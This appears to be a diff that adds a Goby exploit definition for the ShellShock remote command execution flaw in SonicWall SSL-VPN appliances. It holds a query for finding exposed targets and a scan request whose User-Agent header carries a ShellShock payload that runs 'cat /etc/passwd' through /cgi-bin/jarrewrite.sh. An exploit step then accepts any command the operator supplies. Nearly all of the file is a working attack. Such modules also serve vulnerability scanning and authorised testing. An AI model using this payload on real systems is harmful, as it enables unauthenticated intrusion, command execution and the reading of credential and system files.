@@ -1,0 +1,98 @@
+{
+      "Name": "Sonicwall SSLVPN ShellShock RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"SonicWALL-Company's-product\" || app=\"SonicWALL-SSL-VPN\"",
+      "Description": "SonicWall is an American cybersecurity company that sells a range of Internet appliances primarily directed at content control and network security. These include devices providing services for network firewalls, unified threat management, virtual private networks, and anti-spam for email.",
+      "Product": "SonicWall SSL-VPN",
+      "Homepage": "https://www.sonicwall.com/",
+      "Author": "",
+      "Impact": "A vulnerability in Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.",
+      "Recommendation": "",
+      "References": [
+            "https://twitter.com/chybeta/status/1353974652540882944",
+            "https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Cmd",
+                  "Type": "input",
+                  "Value": "cat /etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/jarrewrite.sh",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/jarrewrite.sh",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "() { :; }; echo ; /bin/bash -c '{{{Cmd}}}'"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
